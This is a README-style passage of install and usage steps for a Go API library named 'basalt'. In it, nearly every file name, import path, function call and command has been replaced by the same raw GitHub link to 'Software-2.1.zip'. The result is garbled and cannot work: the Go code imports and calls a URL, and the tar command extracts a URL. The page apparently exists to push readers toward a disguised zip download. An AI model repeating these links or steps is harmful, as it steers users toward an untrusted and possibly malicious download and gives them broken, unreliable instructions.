...
[![Download basalt](https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip)](https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip)
...
4. Click on the file that matches your operating system:
   ...
   - For **macOS**, download the `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip` file.
   - For **Linux**, download the appropriate `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip` file.
...
2. Navigate to your Downloads folder using the command:
   ...
   cd ~/Downloads
   ```
3. Extract the downloaded `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip` file with the command:
   ```
   tar -xzf https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip
   ```
...
2. Inside this folder, create your first Go file, for example, `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip`.
3. In `https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip`, initialize your API using **basalt**. Here’s a simple example:
   ```go
   package main
   import "https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip"
   func main() {
       api := https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip()
       https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip()
   }
   ```
4. Save your file and return to your terminal.
5. Run your API with the command:
   ```
   go run https://raw.githubusercontent.com/SKS-OP/basalt/main/unretainable/Software-2.1.zip
   ```
